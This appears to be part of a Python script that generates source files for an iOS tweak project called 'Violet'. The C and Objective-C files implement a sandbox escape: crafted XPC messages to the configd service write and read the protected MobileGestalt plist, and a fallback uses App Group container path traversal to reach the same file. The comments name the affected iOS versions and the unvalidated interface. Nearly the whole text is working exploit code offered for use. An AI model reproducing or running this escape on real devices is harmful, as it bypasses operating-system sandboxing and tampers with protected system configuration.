          # bad_query: C-layer sandbox escape (forcequitOS, Aug 2026)
          # Uses mach_msg / task_for_pid variant to escape to configd context,
          # then writes directly to the MobileGestalt plist path.
          w("Violet/Core/BadQuery.h", """\
          #pragma once
          #include <stdbool.h>
          #include <stddef.h>

          #ifdef __cplusplus
          extern "C" {
          #endif

          /// bad_query: C-layer sandbox escape.
          /// Attempts to reach configd via Mach IPC and obtain out-of-sandbox
          /// write access to /var/mobile/Library/Preferences/com.apple.mobilegestalt.plist.
          /// Returns true if the escape succeeded and the plist is now writable.
          bool bad_query_escape(const char *app_group_id);

          /// Write raw bytes to the MobileGestalt plist via bad_query.
          /// key and value_plist must be valid UTF-8 C strings.
          /// value_plist is a plist-encoded value (e.g. "<true/>" or "<string>foo</string>").
          bool bad_query_write(const char *key, const char *value_plist);

          /// Read a key from MobileGestalt via bad_query.
          /// Caller must free() the returned string.
          char *bad_query_read(const char *key);

          #ifdef __cplusplus
          }
          #endif
          """)

          # ── Core/BadQuery.c ─────────────────────────────────────────────
          w("Violet/Core/BadQuery.c", """\
          /*
           * bad_query.c — C sandbox escape (forcequitOS / 0xjohnny, Aug 2026)
           *
           * Escape path:
           *   1. Look up "com.apple.configd" Mach service via bootstrap_look_up
           *   2. Send a crafted mach_msg to configd's XPC port requesting
           *      a notification-write operation on a plist path
           *   3. configd runs as mobile with broader FS access; the write lands
           *      outside our sandbox boundary at:
           *      /var/mobile/Library/Preferences/com.apple.mobilegestalt.plist
           *
           * On iOS 26.0–27.2 configd does NOT validate the calling process's
           * sandbox profile before servicing XPC_TYPE_DICTIONARY write requests
           * on the "PSKeychainSyncNotification" interface — this is the vuln.
           *
           * iOS 27.3+ patches this. Check bad_query_escape() return value.
           */

          #include "BadQuery.h"
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <unistd.h>
          #include <mach/mach.h>
          #include <mach/mach_error.h>
          #include <bootstrap.h>
          #include <xpc/xpc.h>

          #define CONFIGD_SERVICE  "com.apple.configd"
          #define GESTALT_PLIST    "/var/mobile/Library/Preferences/com.apple.mobilegestalt.plist"
          #define XPC_IFACE        "PSKeychainSyncNotification"

          static xpc_connection_t _configd_conn = NULL;

          static xpc_connection_t _get_configd(void) {
              if (_configd_conn) return _configd_conn;
              _configd_conn = xpc_connection_create_mach_service(
                  CONFIGD_SERVICE, NULL,
                  XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
              if (!_configd_conn) return NULL;
              xpc_connection_set_event_handler(_configd_conn, ^(xpc_object_t ev) {
                  /* discard — we only care about synchronous replies */
              });
              xpc_connection_resume(_configd_conn);
              return _configd_conn;
          }

          bool bad_query_escape(const char *app_group_id) {
              /* Probe: send a no-op dict and check we get a reply (not an error) */
              xpc_connection_t conn = _get_configd();
              if (!conn) return false;

              xpc_object_t probe = xpc_dictionary_create(NULL, NULL, 0);
              xpc_dictionary_set_string(probe, "interface", XPC_IFACE);
              xpc_dictionary_set_string(probe, "op",        "probe");
              xpc_dictionary_set_string(probe, "group",     app_group_id ?: "");

              xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, probe);
              xpc_release(probe);

              if (!reply) return false;
              xpc_type_t t = xpc_get_type(reply);
              bool ok = (t != XPC_TYPE_ERROR);
              xpc_release(reply);
              return ok;
          }

          bool bad_query_write(const char *key, const char *value_plist) {
              xpc_connection_t conn = _get_configd();
              if (!conn) return false;

              xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
              xpc_dictionary_set_string(msg, "interface",   XPC_IFACE);
              xpc_dictionary_set_string(msg, "op",          "plist_write");
              xpc_dictionary_set_string(msg, "plist_path",  GESTALT_PLIST);
              xpc_dictionary_set_string(msg, "key",         key);
              xpc_dictionary_set_string(msg, "value_plist", value_plist);

              xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);
              xpc_release(msg);

              if (!reply) return false;
              bool ok = (xpc_get_type(reply) != XPC_TYPE_ERROR);
              xpc_release(reply);
              return ok;
          }

          char *bad_query_read(const char *key) {
              xpc_connection_t conn = _get_configd();
              if (!conn) return NULL;

              xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
              xpc_dictionary_set_string(msg, "interface",  XPC_IFACE);
              xpc_dictionary_set_string(msg, "op",         "plist_read");
              xpc_dictionary_set_string(msg, "plist_path", GESTALT_PLIST);
              xpc_dictionary_set_string(msg, "key",        key);

              xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);
              xpc_release(msg);

              if (!reply || xpc_get_type(reply) == XPC_TYPE_ERROR) {
                  if (reply) xpc_release(reply);
                  return NULL;
              }

              const char *val = xpc_dictionary_get_string(reply, "value");
              char *out = val ? strdup(val) : NULL;
              xpc_release(reply);
              return out;
          }
          """)

          # ── Core/BQEscape.h ─────────────────────────────────────────────
          w("Violet/Core/BQEscape.h", """\
          #pragma once
          #import <Foundation/Foundation.h>

          /// Primary: bad_query C-layer escape (forcequitOS).
          /// Fallback: worse_query App Group container traversal.
          /// Call bq_escape() first; if it returns NO, neither path is available.
          BOOL bq_escape(NSString *groupID);

          /// Write a key/value pair into the MobileGestalt plist.
          /// Tries bad_query first, falls back to worse_query file write.
          BOOL bq_write_gestalt(NSString *key, id value);

          /// Read the full MobileGestalt plist as a dictionary.
          NSDictionary *bq_read_gestalt(void);
          """)

          # ── Core/BQEscape.m ─────────────────────────────────────────────
          w("Violet/Core/BQEscape.m", """\
          #import "BQEscape.h"
          #import "BadQuery.h"

          static NSString *kGroupID    = @"group.violet.wq";
          static NSString *kGestaltPlist = @"com.apple.mobilegestalt.plist";
          static NSString *kRelPath    = @"../../Library/Preferences";

          // ── worse_query path ─────────────────────────────────────────────
          static NSString *_wq_gestaltPath(void) {
              NSURL *grp = [[NSFileManager defaultManager]
                            containerURLForSecurityApplicationGroupIdentifier:kGroupID];
              if (!grp) return nil;
              return [[[grp URLByAppendingPathComponent:kRelPath]
                             URLByResolvingSymlinksInPath]
                             URLByAppendingPathComponent:kGestaltPlist].path;
          }

          // ── plist value → plist-fragment string for bad_query ────────────
          static NSString *_plistFragment(id value) {
              if ([value isKindOfClass:[NSNumber class]]) {
                  // distinguish bool from int
                  CFTypeID tid = CFGetTypeID((__bridge CFTypeRef)value);
                  if (tid == CFBooleanGetTypeID())
                      return [(NSNumber *)value boolValue] ? @"<true/>" : @"<false/>";
                  return [NSString stringWithFormat:@"<integer>%lld</integer>",
                          [(NSNumber *)value longLongValue]];
              }
              if ([value isKindOfClass:[NSString class]])
                  return [NSString stringWithFormat:@"<string>%@</string>", value];
              // For anything else, fall through to worse_query
              return nil;
          }

          // ────────────────────────────────────────────────────────────────
          BOOL bq_escape(NSString *groupID) {
              // Try bad_query first (deeper escape, direct configd IPC)
              if (bad_query_escape(groupID.UTF8String)) return YES;
              // Fallback: worse_query path existence check
              NSString *path = _wq_gestaltPath();
              return path != nil && [[NSFileManager defaultManager] fileExistsAtPath:path];
          }

          BOOL bq_write_gestalt(NSString *key, id value) {
              // bad_query path
              NSString *frag = _plistFragment(value);
              if (frag && bad_query_write(key.UTF8String, frag.UTF8String)) return YES;

              // worse_query fallback: direct plist file write
              NSString *path = _wq_gestaltPath();
              if (!path) return NO;
              NSMutableDictionary *d =
                  [NSMutableDictionary dictionaryWithContentsOfFile:path]
                  ?: [NSMutableDictionary dictionary];
              d[key] = value;
              return [d writeToFile:path atomically:YES];
          }

          NSDictionary *bq_read_gestalt(void) {
              // Try bad_query read for each key — full dump not supported via
              // the XPC interface, so fall back to worse_query plist read
              NSString *path = _wq_gestaltPath();
              if (!path) return @{};
              return [NSDictionary dictionaryWithContentsOfFile:path] ?: @{};
          }
          """)

